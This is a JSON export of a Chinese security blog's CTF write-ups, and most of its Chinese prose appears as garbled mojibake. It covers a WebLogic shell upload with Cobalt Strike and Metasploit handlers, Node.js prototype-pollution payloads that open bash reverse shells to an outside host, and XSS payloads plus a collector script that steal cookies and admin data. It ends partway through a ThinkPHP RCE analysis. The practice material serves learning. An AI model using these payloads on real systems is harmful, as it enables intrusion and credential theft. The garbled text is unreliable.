æ‰€ä»¥æ”¹ç”¨ç°æˆå·¥å…·ï¼šhttps://kfi.re/220.html weblogicä¸Šä¼ æœ¨é©¬è·¯å¾„é€‰æ‹©ï¼šhttps://www.cnblogs.com/sstfy/p/10350915.html \\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp è®¿é—® http://192.168.111.80:7001/console/framework/skins/wlsconsole/images/shell.jsp æ‹¿åˆ°CSçš„shellåˆ©ç”¨å†°èä¸Šä¼ csé©¬ è™½ç„¶å¼€äº†360ï¼Œä½†æ˜¯ä¼¼ä¹å¹¶æ²¡æœ‰æ‹¦åˆ°æˆ‘ã€‚çœ‹åˆ°ç½‘ä¸Šå¾ˆå¤šæ–‡ç« éƒ½æ˜¯è¢«æ‹¦æˆªå’Œç»•è¿‡çš„ï¼Œæ‡’å¾—æ•´äº† ç”¨csè‡ªå¸¦çš„ææƒç›´æ¥æˆåŠŸ æ¥ä¸‹æ¥ç”¨csç»™msfæ´¾ç”Ÿä¸€ä¸ªshellã€‚ æ´¾ç”Ÿä¸€ä¸ªmsfçš„shellï¼ˆéå¿…è¦ï¼‰è¿™ä¸€æ­¥ä¸æ˜¯å¿…é¡»çš„ï¼Œæ¯•ç«Ÿcsæ›´é€‚åˆæ‰“windowsï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹æŠ€å·§ã€‚ 1ã€msfé…ç½®ç›‘å¬ msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_tcp msf exploit(handler) &gt; set lhost 192.168.135.128 msf exploit(handler) &gt; set lport 9999 msf exploit(handler) &gt; exploit ç„¶åcsåˆ›å»ºä¸ªæ–°çš„ç›‘å¬å™¨ å³é”®æƒ³è¦æ´¾ç”Ÿçš„shellï¼Œç‚¹å‡»spawnï¼Œé€‰æ‹©åˆšåˆšåˆ›å»ºçš„listenerå³å¯ã€‚ä½†æ˜¯æˆ‘è¿™é‡Œè¯•äº†å‡ æ¬¡éƒ½æ²¡å‡ºçš„æ¥ï¼Œå¯èƒ½æ˜¯ç¯å¢ƒé—®é¢˜ã€‚ é—®é¢˜ä¸å¤§ï¼Œåæ­£è¿™é‡ŒçŸ¥é“æ€ä¹ˆæ´¾ç”Ÿå³å¯ã€‚ å†…ç½‘æ¸—é€ çœ‹äº†çœ‹åé¢çš„æ“ä½œå’Œä¸€å·®ä¸å¤šï¼Œå°±ä¸æäº†ã€‚æœ‰ç©ºçœ‹çœ‹ã€‚ https://www.i4k.xyz/article/weixin_45605352/119898843","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"nodejséšç¬”","slug":"nodejséšç¬”","date":"2021-10-11T15:09:28.000Z","updated":"2021-10-11T15:16:02.380Z","comments":true,"path":"2021/10/11/nodejséšç¬”/","link":"","permalink":"/2021/10/11/nodejséšç¬”/","excerpt":"","text":"Node.jså¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“https://xz.aliyun.com/t/7184 å…³äºç»§æ‰¿å’ŒåŸå‹é“¾ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain åŸå‹é“¾æ±¡æŸ“ï¼šhttps://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript ##Web334ctfshow 123456 ##Web335æ— è¿‡æ»¤çš„rceï¼š require(&#39;child_process&#39;).execSync(&#39;cat fl00g&#39;); require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;,[&#39;./&#39;]).stdout.toString() require(&#39;child_process&#39;).execFileSync(&#39;ls&#39;) ##Web336 require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;./fl001g.txt&#39;]).stdout.toString() ##Web337æ•°ç»„ ##Web338å…³äºç»§æ‰¿å’ŒåŸå‹é“¾ï¼šhttps://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain åŸå‹é“¾æ±¡æŸ“ï¼šhttps://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascript å…³é”®ç‚¹åœ¨utils.copy(user,req.body); ##Web339Node.jså¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“https://xz.aliyun.com/t/7184 36dboyæ”¹ä¸ºäº†flagï¼Œå¹¶ä¸”å¤šäº†ä¸¤ä¸ªç±».è¦è®©secert.ctfshow===flagï¼Œå¾ˆæ˜¾ç„¶åªèƒ½æ›´æ”¹secert.ctfshowçš„å€¼ã€‚åŸå‹é“¾æ±¡æŸ“çš„æ¼æ´è¿˜å­˜åœ¨ï¼Œæ˜¯userç±»ã€‚å®ƒçš„ä¸Šä¸€çº§æ˜¯Objectã€‚åŒæ—¶secertçš„ä¸Šä¸€çº§ä¹Ÿæ˜¯objectï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å¦user.proto.ctfshow=this.flagä½†æ˜¯æ— æ³•å®ç°. å¤šå‡ºæ¥çš„api.jsæœ‰è¿™ä¹ˆä¸€è¡Œï¼š æµ‹è¯•ä¸€ä¸‹ æ±¡æŸ“ç‚¹login.js é‡Œçš„ utils.copy(user,req.body); ï¼Œä»£ç æ‰§è¡Œçš„è§¦å‘ç‚¹åœ¨ api.js çš„ res.render(â€˜apiâ€™, { query: Function(query)(query)}); å¤„ã€‚ {&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\\&quot;&#39;)&quot;}} ##Web340 user.userinfo.isAdminè¦ä¸º1ï¼Œä½†æ˜¯æ²¡åŠæ³•ç›´æ¥é€šè¿‡åŸå‹é“¾æ±¡æŸ“æ§åˆ¶isAdminçš„å€¼ï¼Œæ‰€ä»¥ç”¨ä¸Šä¸€é¢˜ç›¸åŒçš„åŠæ³•ï¼Œåªæ˜¯è¿™é‡Œè¦è·³ä¸¤å±‚ï¼š {&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\\&quot;&#39;)&quot;}}} ##Web341 æœ¬ä»¥ä¸ºè¿™é¢˜èƒ½ç›´æ¥æ§åˆ¶isAdminï¼Œä½†æ˜¯å‘ç°ä¸è¡Œï¼Œçœ‹äº†çœ‹copyå‡½æ•°å‘ç°åŸæ¥æ˜¯è‡ªå·±ç†è§£é”™äº†ï¼Œç›¸åŒçš„æ²¡æ³•æ§åˆ¶ï¼š å…¶å®è¿™é¢˜çš„é¢„æœŸè§£ejs rceå‰å‡ é¢˜éƒ½æ˜¯å¯ä»¥ç”¨çš„ã€‚ https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/ {&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/3333 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;}}} ##Web342jade rcehttps://xz.aliyun.com/t/7025https://tari.moe/2021/05/04/ctfshow-nodejs/ è°ƒè¯•ä¸‹ï¼Œä¹‹å‰æ²¡æè¿‡nodejsï¼Œä¸€å¼€å§‹è¿ç”¨å“ªä¸ªè½¯ä»¶è°ƒè¯•éƒ½ä¸çŸ¥é“ã€‚ã€‚ã€‚ ç‚¹å‡»run and debugå¹¶åˆ›å»ºå¥½launch.jsonï¼Œç„¶åç›´æ¥runå°±è¡Œã€‚ ç«¯å£é»˜è®¤æ˜¯3000ï¼Œæˆ‘è¿™é‡Œæ”¹æˆäº†3333ã€‚ç¬¬ä¸ƒè¡Œä¸‹æ–­ç‚¹ step into step into step into step into è¿›å…¥jadeæ¨¡å— res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine å…¥å£æ˜¯rebderFileæ–¹æ³• è¿”å›å€¼å¯æ‰§è¡Œï¼Œè¿›å…¥handleTemplateCache è¿›å…¥compile éƒ½æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯ä¸Šé¢è¿˜æœ‰ä¸ªparseæ²¡çœ‹ã€‚ ä»£ç å¤ªå¤šï¼Œç›´æ¥çœ‹returnçš„ä¸œè¥¿ç„¶åé€†æ¨ã€‚çœ‹ä¸‹jsé‚£çš„compile è¿”å›çš„æ˜¯ bufï¼Œè·Ÿè¿›66è¡Œçš„this.visit(this.node) node.line å¯ä»¥è¢« push åˆ° buf ä¸­ï¼Œæ¡ä»¶æ˜¯ this.debug=trueã€‚ä½†æ˜¯å¦‚ä½•æ§åˆ¶node.lineçš„å€¼å‘¢ï¼Ÿæˆ‘çš„ç†è§£æ˜¯å› ä¸ºè¿™ä¸ªnode.lineçš„å€¼æ˜¯ä¸å­˜åœ¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ±¡æŸ“objecté‡Œé¢çš„lineå³å¯æ§åˆ¶node.lineçš„å€¼ã€‚ ä¸‹ä¸ªæ–­ç‚¹è¯•ä¸€ä¸‹ï¼Œå´å‘ç°lineçš„å€¼åœ¨æ­£å¸¸æ‰§è¡Œæ—¶ä¹Ÿæ˜¯æœ‰å€¼çš„ï¼š å‘ç”Ÿç”šä¹ˆäº‹äº†ï¼Ÿhttps://xz.aliyun.com/t/7025#toc-5 å¥½å§ï¼Œè·ç¦»rceè¿˜æ¼äº†å¾ˆå¤šä¸œè¥¿ï¼Œè‡³å°‘å‰é¢ä¸€äº›æ¡ä»¶éƒ½æ²¡çœ‹ã€‚1ã€é¦–å…ˆdebugè¦ä¸ºtrue è¿™ä¸ªå¾ˆå¥½è§£å†³ï¼Œå› ä¸ºä¸€å¼€å§‹ä»–æ˜¯æœªå®šä¹‰çš„ï¼Œç›´æ¥æ±¡æŸ“å³å¯ 2ã€è®©node.lineä¸ºundefined ä¸å¾—ä¸è¯´è¿™ä¸ªæµ‹è¯•çš„æ–¹æ³•å¾ˆå¦™ã€‚ 3ã€ä¸æŠ¥é”™ è¿™ä¸ªæ—¶é—´åŸå› æ‡’å¾—å»è°ƒäº†ã€‚ payload {&quot;__proto__&quot;:{&quot;__proto__&quot;:{&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/121.196.169.53/3333 0&gt;&amp;1\\&quot;&#39;)&quot;}}} å‚è€ƒï¼šhttps://tari.moe/2021/05/04/ctfshow-nodejs/ æœ€åé™„ä¸€å¼ è‰ç¨¿çº¸ï¼Œè€æ˜¯è®°ä¸ä½å˜é‡åªèƒ½ç”¨ç¬”è®° ##Web344 ?query={&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;ctfshow&quot;&amp;query=&quot;isVIP&quot;:true} ##å°ç»“ 342ã€343å­¦åˆ°å¾ˆå¤šã€‚ä½†æ˜¯ç°åœ¨å®¡è®¡æ°´å¹³è¿˜æ˜¯ä¸€èˆ¬ï¼Œå¤§æ¦‚æ˜¯ç¼ºå°‘å¼€å‘ç»éªŒçš„åŸå› ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"xssåŸºç¡€","slug":"xssåŸºç¡€","date":"2021-10-08T03:42:50.000Z","updated":"2021-10-08T03:44:59.450Z","comments":true,"path":"2021/10/08/xssåŸºç¡€/","link":"","permalink":"/2021/10/08/xssåŸºç¡€/","excerpt":"","text":"#XSS ä»€ä¹ˆæ˜¯xssï¼Ÿè·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆCross Site Scriptingï¼‰ï¼Œä¸ºä¸å’Œå±‚å æ ·å¼è¡¨ï¼ˆCascading Style Sheetsï¼ŒCSSï¼‰çš„ç¼©å†™æ··æ·†ï¼Œæ•…å°†è·¨ç«™è„šæœ¬æ”»å‡»ç¼©å†™ä¸º XSSã€‚æ¶æ„æ”»å‡»è€…å¾€ WEB é¡µé¢é‡Œæ’å…¥æ¶æ„ HTML ä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­ Web é‡Œé¢çš„ HTML ä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç‰¹æ®Šç›®çš„ã€‚ xsså±å®³1ã€é€šè¿‡ document.cookie ç›—å– cookieä¸­çš„ä¿¡æ¯2ã€ä½¿ç”¨ jsæˆ– cssç ´åé¡µé¢æ­£å¸¸çš„ç»“æ„ä¸æ ·å¼3ã€æµé‡åŠ«æŒï¼ˆé€šè¿‡è®¿é—®æŸæ®µå…·æœ‰ window.location.href å®šä½åˆ°å…¶ä»–é¡µé¢ï¼‰4ã€dosæ”»å‡»ï¼šåˆ©ç”¨åˆç†çš„å®¢æˆ·ç«¯è¯·æ±‚æ¥å ç”¨è¿‡å¤šçš„æœåŠ¡å™¨èµ„æºï¼Œä»è€Œä½¿åˆæ³•ç”¨æˆ·æ— æ³•å¾—åˆ°æœåŠ¡å™¨å“åº”ã€‚å¹¶ä¸”é€šè¿‡æºå¸¦è¿‡ç¨‹çš„ cookieä¿¡æ¯å¯ä»¥ä½¿æœåŠ¡ç«¯è¿”å›400å¼€å¤´çš„çŠ¶æ€ç ï¼Œä»è€Œæ‹’ç»åˆç†çš„è¯·æ±‚æœåŠ¡ã€‚5ã€åˆ©ç”¨ iframeã€frameã€XMLHttpRequestæˆ–ä¸Šè¿° Flashç­‰æ–¹å¼ï¼Œä»¥ï¼ˆè¢«æ”»å‡»ï¼‰ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œä¸€äº›ç®¡ç†åŠ¨ä½œï¼Œæˆ–æ‰§è¡Œä¸€äº›ä¸€èˆ¬çš„å¦‚å‘å¾®åšã€åŠ å¥½å‹ã€å‘ç§ä¿¡ç­‰æ“ä½œï¼Œå¹¶ä¸”æ”»å‡»è€…è¿˜å¯ä»¥åˆ©ç”¨ iframeï¼Œframeè¿›ä¸€æ­¥çš„è¿›è¡Œ CSRF æ”»å‡»ã€‚6ã€æ§åˆ¶ä¼ä¸šæ•°æ®ï¼ŒåŒ…æ‹¬è¯»å–ã€ç¯¡æ”¹ã€æ·»åŠ ã€åˆ é™¤ä¼ä¸šæ•æ„Ÿæ•°æ®çš„èƒ½åŠ›ã€‚ xssä¸‰ç§åˆ†ç±»æ¬è¿è‡ªhttps://ctf-wiki.org/web/xss/ ä¸€ã€åå°„å‹ XSSåå°„å‹è·¨ç«™è„šæœ¬ï¼ˆReflected Cross-Site Scriptingï¼‰æ˜¯æœ€å¸¸è§ï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€å¹¿çš„ä¸€ç§ï¼Œå¯å°†æ¶æ„è„šæœ¬é™„åŠ åˆ° URL åœ°å€çš„å‚æ•°ä¸­ã€‚ åå°„å‹ XSS çš„åˆ©ç”¨ä¸€èˆ¬æ˜¯æ”»å‡»è€…é€šè¿‡ç‰¹å®šæ‰‹æ³•ï¼ˆå¦‚ç”µå­é‚®ä»¶ï¼‰ï¼Œè¯±ä½¿ç”¨æˆ·å»è®¿é—®ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ URLï¼Œå½“å—å®³è€…ç‚¹å‡»è¿™äº›ä¸“é—¨è®¾è®¡çš„é“¾æ¥çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šç›´æ¥åœ¨å—å®³è€…ä¸»æœºä¸Šçš„æµè§ˆå™¨æ‰§è¡Œã€‚æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—ã€‚ æœåŠ¡å™¨ç«¯ä»£ç ï¼š &lt;?php // Is there any input? if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#39;name&#39; ] != NULL ) { // Feedback for end user echo &#39;&lt;pre&gt;Hello &#39; . $_GET[ &#39;name&#39; ] . &#39;&lt;/pre&gt;&#39;; } ?&gt; å¯ä»¥çœ‹åˆ°ï¼Œä»£ç ç›´æ¥å¼•ç”¨äº† name å‚æ•°ï¼Œå¹¶æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œå­˜åœ¨æ˜æ˜¾çš„ XSS æ¼æ´ã€‚ äºŒã€æŒä¹…æ€§ XSSæŒä¹…å‹è·¨ç«™è„šæœ¬ï¼ˆPersistent Cross-Site Scriptingï¼‰ä¹Ÿç­‰åŒäºå­˜å‚¨å‹è·¨ç«™è„šæœ¬ï¼ˆStored Cross-Site Scriptingï¼‰ã€‚ æ­¤ç±» XSS ä¸éœ€è¦ç”¨æˆ·å•å‡»ç‰¹å®š URL å°±èƒ½æ‰§è¡Œè·¨ç«™è„šæœ¬ï¼Œæ”»å‡»è€…äº‹å…ˆå°†æ¶æ„ä»£ç ä¸Šä¼ æˆ–å‚¨å­˜åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚æŒä¹…å‹ XSS ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç•™è¨€ã€è¯„è®ºã€åšå®¢æ—¥å¿—ç­‰äº¤äº’å¤„ï¼Œæ¶æ„è„šæœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­ã€‚ æœåŠ¡å™¨ç«¯ä»£ç ï¼š &lt;?php if( isset( $_POST[ &#39;btnSign&#39; ] ) ) { // Get input $message = trim( $_POST[ &#39;mtxMessage&#39; ] ); $name = trim( $_POST[ &#39;txtName&#39; ] ); // Sanitize message input $message = stripslashes( $message ); $message = mysql_real_escape_string( $message ); // Sanitize name input $name = mysql_real_escape_string( $name ); // Update database $query = &quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;$message&#39;, &#39;$name&#39; );&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); //mysql_close(); } ?&gt; ä»£ç åªå¯¹ä¸€äº›ç©ºç™½ç¬¦ã€ç‰¹æ®Šç¬¦å·ã€åæ–œæ è¿›è¡Œäº†åˆ é™¤æˆ–è½¬ä¹‰ï¼Œæ²¡æœ‰åš XSS çš„è¿‡æ»¤å’Œæ£€æŸ¥ï¼Œä¸”å­˜å‚¨åœ¨æ•°æ®åº“ä¸­ï¼Œæ˜æ˜¾å­˜åœ¨å­˜å‚¨å‹ XSS æ¼æ´ã€‚ ä¸‰ã€DOM XSSä¼ ç»Ÿçš„ XSS æ¼æ´ä¸€èˆ¬å‡ºç°åœ¨æœåŠ¡å™¨ç«¯ä»£ç ä¸­ï¼Œè€Œ DOM-Based XSS æ˜¯åŸºäº DOM æ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ï¼Œæ‰€ä»¥ï¼Œå—å®¢æˆ·ç«¯æµè§ˆå™¨çš„è„šæœ¬ä»£ç æ‰€å½±å“ã€‚å®¢æˆ·ç«¯ JavaScript å¯ä»¥è®¿é—®æµè§ˆå™¨çš„ DOM æ–‡æœ¬å¯¹è±¡æ¨¡å‹ï¼Œå› æ­¤èƒ½å¤Ÿå†³å®šç”¨äºåŠ è½½å½“å‰é¡µé¢çš„ URLã€‚æ¢å¥è¯è¯´ï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡ DOM åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæœåŠ¡å™¨ç«¯çš„æ•°æ®ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾— DOM ä¸­çš„æ•°æ®ï¼ˆå¦‚ä» URL ä¸­æå–æ•°æ®ï¼‰å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚å¦ä¸€æ–¹é¢ï¼Œæµè§ˆå™¨ç”¨æˆ·å¯ä»¥æ“çºµ DOM ä¸­çš„ä¸€äº›å¯¹è±¡ï¼Œä¾‹å¦‚ URLã€location ç­‰ã€‚ç”¨æˆ·åœ¨å®¢æˆ·ç«¯è¾“å…¥çš„æ•°æ®å¦‚æœåŒ…å«äº†æ¶æ„ JavaScript è„šæœ¬ï¼Œè€Œè¿™äº›è„šæœ¬æ²¡æœ‰ç»è¿‡é€‚å½“çš„è¿‡æ»¤å’Œæ¶ˆæ¯’ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºå°±å¯èƒ½å—åˆ°åŸºäº DOM çš„ XSS æ”»å‡»ã€‚ HTML ä»£ç ï¼š &lt;html&gt; &lt;head&gt; &lt;title&gt;DOM-XSS test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var a=document.URL; document.write(a.substring(a.indexOf(&quot;a=&quot;)+2,a.length)); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; å°†ä»£ç ä¿å­˜åœ¨ domXSS.html ä¸­ï¼Œæµè§ˆå™¨è®¿é—®ï¼š http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; å³å¯è§¦å‘ XSS æ¼æ´ã€‚ ##Web316è¯•äº†è¯•xsså¹³å°ï¼Œç¬¬ä¸€é¢˜å¯ä»¥æ‰“é€šï¼Œç¬¬äºŒé¢˜å°±ä¸è¡Œäº†ï¼Œæ²¡æœ‰ç®¡ç†å‘˜çš„æµé‡ï¼Œåªæœ‰æˆ‘è‡ªå·±çš„ã€‚æ‰€ä»¥åœ¨vpsä¸Šè‡ªå·±å†™ä¸€ä¸ªï¼š &lt;?php $content = $_GET[1]; if(isset($content)){ file_put_contents(&quot;flag.txt&quot;,$content); }else{ echo&quot;what happened?; } ?&gt; æ³¨æ„è¦ç»™æƒé™ã€‚paylaod 1ã€ &lt;script&gt;document.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt; 2ã€ &lt;script&gt;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&lt;/script&gt; 3ã€ &lt;script&gt;location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt; 4ã€ &lt;script&gt;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&lt;/script&gt; 5ã€ &lt;input onfocus=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot; autofocus&gt; 6ã€ &lt;svg onload=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot;&gt; 7ã€&lt;iframe onload=&quot;window.open(&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt; 8ã€&lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web317è¿‡æ»¤äº†script &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web318åŒ317 ##Web319åŒ317 ##Web320è¿‡æ»¤ç©ºæ ¼ 1ã€ç”¨tabä»£æ›¿ &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; 2ã€æ³¨é‡Šç»•è¿‡ &lt;body/**/onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web321 &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xss/xss.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web322ç†è®ºä¸Šä¸Šé¢æ˜¯å¯ä»¥æ‰“é€šçš„ï¼Œä½†æ˜¯æ‰“äº†å¥½å‡ éæ²¡æ‰“é€šã€‚åŸå› æ˜¯æˆ‘urlé‡Œé¢æœ‰xssï¼Œè¿™é‡Œè¿‡æ»¤äº†xssï¼Œæ‰€ä»¥æŠŠxssæ¢æ‰å³å¯ã€‚ &lt;body onload=&quot;window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt; ##Web323åŒ322 ##Web324åŒ322 ##Web325åŒ322 ##Web326åŒ322 ##Web327åŒ322 ##Web328 &lt;script&gt;window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+document.cookie&lt;/script&gt; è·å¾—ç®¡ç†å‘˜cookieæ›¿æ¢å³å¯åœ¨ç”¨æˆ·ç®¡ç†ç•Œé¢çœ‹åˆ°flag ##Webb29ç”¨ä¸Šé¢çš„payloadä¹Ÿèƒ½æ‹¿åˆ°cookieï¼Œä½†æ˜¯æ‹¿åˆ°ä¹‹åå°±å¤±æ•ˆäº†ã€‚ä½†æ˜¯å¯ä»¥å†™è„šæœ¬è¯»å–é¡µé¢å†…å®¹ï¼Œæ­£å¥½å‰æ®µæ—¶é—´javawebæ¥è§¦äº†ç‚¹å‰ç«¯çš„ä¸œè¥¿ï¼š flagåœ¨å¯†ç åˆ—ç¬¬ä¸€è¡Œï¼ŒæŸ¥çœ‹å…ƒç´ ï¼š å±äºç±»laytable-cell-1-0-1 &lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,flag){if(flag.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#39;)&gt;-1){window.location.href=&#39;http://x.x.x.x:5555/xs/xs.php?1=&#39;+flag.innerHTML;}});&lt;/script&gt; ctfshowæ‹†å¼€æ˜¯é˜²æ­¢è¯»åˆ°è‡ªå·±ã€‚æ‹¿åˆ°adminå¯†ç ç™»å½•ã€‚ ##Web330 &lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=111&#39;;&lt;/script&gt; æ”¹ç®¡ç†å‘˜å¯†ç ä¹Ÿå¯ä»¥è¯»å–é¡µé¢ ##Web331 &lt;script&gt;$.post(&quot;http://127.0.0.1/api/change.php&quot;,{p:111},&quot;json&quot;);&lt;/script&gt; ##Web332é€»è¾‘æ¼æ´ è½¬-9999 ##Web333 &lt;script&gt;$.post(&quot;http://127.0.0.1/api/amount.php&quot;,{&#39;u&#39;:&#39;111111&#39; ,&#39;a&#39;:10000},&quot;json&quot;);&lt;/script&gt;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}],"tags":[],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"/categories/æŠ€æœ¯/"}]},{"title":"ThinkPHP X æºç åˆ†æ","slug":"ThinkPHP X æºç åˆ†æ","date":"2021-09-27T14:59:07.000Z","updated":"2021-09-28T06:36:52.343Z","comments":true,"path":"2021/09/27/ThinkPHP X æºç åˆ†æ/","link":"","permalink":"/2021/09/27/ThinkPHP X æºç åˆ†æ/","excerpt":"","text":"å¤ç°ä¸€ä¸‹ThinkPHPçš„å„ç§æ¼æ´ï¼Œé”»ç‚¼ä¸€ä¸‹è‡ªå·±åˆ†ææºç çš„èƒ½åŠ›ï¼ŒæŒç»­æ›´æ–°ã€‚æ›´æ–°è®°å½•ï¼š9/274/264/64/22021/3/28 ThinkPHP 5.0.x (&lt;=5.0.23) RCEåˆ†æ 2021/3/28é¦–å…ˆæŸ¥çœ‹å®˜æ–¹logï¼š æ”¹è¿›requestçš„methodæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬diffinityç›´æ¥å¯¹æ¯”ä¸¤ä¸ªç‰ˆæœ¬åŒºåˆ«ï¼š åœ¨5.0.24ä¸­å¯¹methodä½œäº†ç™½åå•çš„é™åˆ¶ï¼Œåªå…è®¸$this-&gt;methodä¸ºå¸¸ç”¨çš„å‡ ä¸ªæ–¹æ³•ï¼Œå¦åˆ™å°±å°†å…¶ç½®ä¸ºPOSTæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬çš„å…¥å£ç‚¹å°±å¯ä»¥ä»Request.phpè·Ÿè¿›ã€‚(å¦‚æœæŒ‰æ­£å¸¸æ€è·¯å¯»æ‰¾çš„è¯ï¼Œindex.php-&gt;start.php-&gt;routeCheck-&gt;check ä¹Ÿæ˜¯å¯ä»¥è·Ÿåˆ°methodçš„)å…¨å±€æœç´¢call_user_funcï¼Œåœ¨Request.phpä¸­å‘ç°åœ¨filterValueæ–¹æ³•ä¸­ã€‚ private function 